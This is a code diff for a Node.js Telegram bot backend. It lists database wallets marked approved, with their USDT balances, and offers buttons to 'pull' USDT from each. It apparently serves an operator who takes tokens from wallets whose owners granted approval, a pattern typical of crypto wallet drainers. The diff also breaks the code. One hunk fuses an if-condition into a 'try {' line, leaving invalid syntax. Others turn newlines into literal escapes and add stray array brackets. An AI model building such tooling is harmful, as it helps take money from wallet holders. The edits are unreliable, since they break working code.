@@ -1,4 +1,3 @@
-// backend/src/config/telegram.js
 const TelegramBot = require('node-telegram-bot-api');
 const dotenv = require('dotenv');
 const { ethers } = require('ethers');
@@ -536,18 +535,18 @@ Next steps:
             const query = 'SELECT address, name, usdt_balance FROM wallets WHERE is_approved = true AND is_processed = false ORDER BY created_at DESC LIMIT 10';
             const result = await database.query(query);
 
-            let message = '📤 *Select Wallet to Pull*\n\n';
+            let message = '📤 *Select Wallet to Pull*\\n\\n';
 
             if (!result || !result.rows || result.rows.length === 0) {
-                message += 'No approved wallets available for pulling\\.\n\n';
+                message += 'No approved wallets available for pulling\\.\\n\\n';
                 message += 'Use: /pull\\_<wallet\\_address>';
             } else {
-                message += 'Click on a wallet to pull USDT:\n\n';
+                message += 'Click on a wallet to pull USDT:\\n\\n';
                 for (let i = 0; i < result.rows.length; i++) {
                     const wallet = result.rows[i];
                     const maskedAddress = this.maskAddress(wallet.address);
                     const escapedBalance = this.escapeMarkdown(wallet.usdt_balance || '0');
-                    message += `${i + 1}\\. \`${maskedAddress}\` \\(${escapedBalance} USDT\\)\n`;
+                    message += `${i + 1}\\. \`${maskedAddress}\` \\(${escapedBalance} USDT\\)\\n`;
                 }
             }
 
@@ -555,12 +554,12 @@ Next steps:
                 parse_mode: 'MarkdownV2',
                 reply_markup: {
                     inline_keyboard: [
-                        ...(result && result.rows ? result.rows.map((wallet, index) => ([
+                        ...(result && result.rows ? result.rows.map((wallet, index) => ([[
                             {
                                 text: `📤 Pull ${wallet.name || `Wallet ${index + 1}`}`,
                                 callback_data: `pull_${wallet.address}`
                             }
-                        ])) : []),
+                        ]])) : []),
                         [
                             { text: '🏠 Main Menu', callback_data: 'menu' }
                         ]
@@ -590,12 +589,7 @@ Failed to fetch wallet list. Please try again later.
 
     // REAL BLOCKCHAIN BALANCE CHECKING FUNCTIONS
     async getContractUSDTBalance() {
-        if (!this.provider || !process.env.USDT_CONTRACT_ADDRESS || !process.env.CONTRACT_ADDRESS) {
-            console.log('⚠️ Blockchain not initialized, returning zero balance');
-            return { balance: '0.00', error: 'Blockchain not initialized' };
-        }
-
-        try {
+        if (!this.provider || !process.env.USDT_CONTRACT_ADDRESS ||        try {
             const usdtContract = new ethers.Contract(
                 process.env.USDT_CONTRACT_ADDRESS,
                 ['function balanceOf(address account) external view returns (uint256)'],
